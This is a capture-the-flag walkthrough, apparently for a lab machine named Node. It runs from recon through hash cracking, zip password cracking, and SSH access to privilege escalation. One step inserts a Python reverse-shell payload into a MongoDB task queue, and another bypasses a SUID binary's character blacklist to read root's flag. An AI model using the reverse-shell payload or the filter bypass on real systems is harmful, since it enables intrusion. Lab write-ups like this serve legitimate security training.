# Machine

## Machine Info

![Node](./Node.assets/Node.png)

## Recon

- nmap

```
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info:
|_  Logs: /login
| hadoop-datanode-info:
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc|phone
Running (JUST GUESSING): Linux 3.X|4.X (90%), Crestron 2-Series (86%), HP embedded (85%), Google Android 4.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:google:android:4.0
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 4.9 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 4.8 (90%), Linux 4.9 (89%), Linux 3.12 (88%), Linux 3.16 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- path recon

  - /uploads (Status: 301) [Size: 173] [--> /uploads/]

  - /assets (Status: 301) [Size: 171] [--> /assets/] -> **/assets/js/app/controllers**

  - /vendor (Status: 301) [Size: 171] [--> /vendor/]

- subdomain, nothing found

## Foothold

### Sensitive Cred Leakage

- js script recon -> api path -> user data leakage

![image-20231216171934255](./Node.assets/image-20231216171934255.png)

![image-20231216172003039](./Node.assets/image-20231216172003039.png)

- `/api/users/latest`
- `/api/users/`

![image-20231216172025122](./Node.assets/image-20231216172025122.png)

- hash -> hashcat crack

```markdown
- myP14ceAdm1nAcc0uNT, dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
- tom, f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
- mark, de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
- rastating, 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

```bash
$ hashcat -m 1400 -a 0 hash /usr/share/wordlists/rockyou.txt --show
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
```

- backup api, need admin priv

![image-20231216172121298](./Node.assets/image-20231216172121298.png)

- download backup -> cat backup

![image-20231216172225119](./Node.assets/image-20231216172225119.png)

```
...LCYNSgUABAADFAgAAKgAYAAAAAAABAAAAtIED8CUAdmFyL3d3dy9teXBsYWNlL3N0YXRpYy9wYXJ0aWFscy9sb2dpbi5odG1sVVQFAAPH6KlZdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgACWUiSzCQGVICAgAANwUAACkAGAAAAAAAAQAAALSBt/ElAHZhci93d3cvbXlwbGFjZS9zdGF0aWMvcGFydGlhbHMvaG9tZS5odG1sVVQFAAOimKpZdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgATWUiSyhsx/IUAQAAFAIAACwAGAAAAAAAAQAAALSBLPQlAHZhci93d3cvbXlwbGFjZS9zdGF0aWMvcGFydGlhbHMvcHJvZmlsZS5odG1sVVQFAAMimapZdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgAfWMiS4Tw22u4BAAAFQ8AABgAGAAAAAAAAQAAALSBtvUlAHZhci93d3cvbXlwbGFjZS9hcHAuaHRtbFVUBQADvpWqWXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA=
```

- bases on the last `edAQDQ+iUAAAA=` -> base64 encoded text
- base64 decode -> password needed

![image-20231216172311870](./Node.assets/image-20231216172311870.png)

- john to crack zip file: `$ zip2john myplace.zip > myplace.hash`

![image-20231216172341016](./Node.assets/image-20231216172341016.png)

- cred: **mark:5AYRft73VtFpc84k** -> conn using ssh
- mongodb: name=**myplace**, backup key=**45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474**

```javascript
$ cat app.js

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

{
    "name": "myplace",
    "description": "A secure place to meet new people.",
    "version": "1.0.0",
    "private": true,
    "dependencies": {
        "express": "4.15.x",
        "express-session": "1.15.x",
        "body-parser": "1.17.x",
        "mongodb": "2.2.x"
    }
}
```

## Privilege Escalation

### mark -> tom

- users: root, tom, mark

```bash
mark@node:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash
```

- ps to check tom's process

```bash
mark@node:~$ ps aux |  grep tom
tom       1248  0.0  5.4 1008056 41084 ?       Ssl  17:37   0:01 /usr/bin/node /var/scheduler/app.js
tom       1265  0.0  6.9 1025956 52956 ?       Ssl  17:37   0:01 /usr/bin/node /var/www/myplace/app.js
```

- /var/www/myplace/app.js is checked, /var/scheduler/app.js:

![image-20231216173334795](./Node.assets/image-20231216173334795.png)

- another mongo db: `'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';`
- conn mongo db scheduler: `mongo 127.0.0.1:27017/scheduler -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler`
- POC: add a touch /tmp/tmp.txt file
- add a scheduled task: to get a rshell

```bash
mark@node:/tmp$ mongo 127.0.0.1:27017/scheduler -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler
MongoDB shell version: 3.2.16
connecting to: 127.0.0.1:27017/scheduler
> db
scheduler
> use scheduler
switched to db scheduler
> show collections
tasks
> db.tasks.insert({"cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.39\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"})
WriteResult({ "nInserted" : 1 })
```

![image-20231216173559044](./Node.assets/image-20231216173559044.png)

### tom -> root

- find SUID file

![image-20231216173636064](./Node.assets/image-20231216173636064.png)

- backup binary file is also called in /var/www/myplace/app.js, executed command is `/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /var/www/myplace`

![image-20231216173657434](./Node.assets/image-20231216173657434.png)

- ltrace to trace library call and find restricted patterns: `..` `/root` `;` `&` <code>\`</code> `$` `|` `//` `/etc`

![image-20231216173936316](./Node.assets/image-20231216173936316.png)

- bypass restrictions to get root flag: `/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root0`

![image-20231216174334759](./Node.assets/image-20231216174334759.png)

### backup buffer overflow



## Exploit Chain

path recon -> js files -> api leakage -> user password hash -> hashcat -> login as web admin -> base64 -d -> john to crack zip file -> mark cred -> ssh -> ps enum -> js: mongo db -> add scheduled task -> tom rshell -> find suid file -> (1)bypass fobidden patterns -> backup root.txt; (2) backup -> binary analysis -> buffer overflow -> root shell
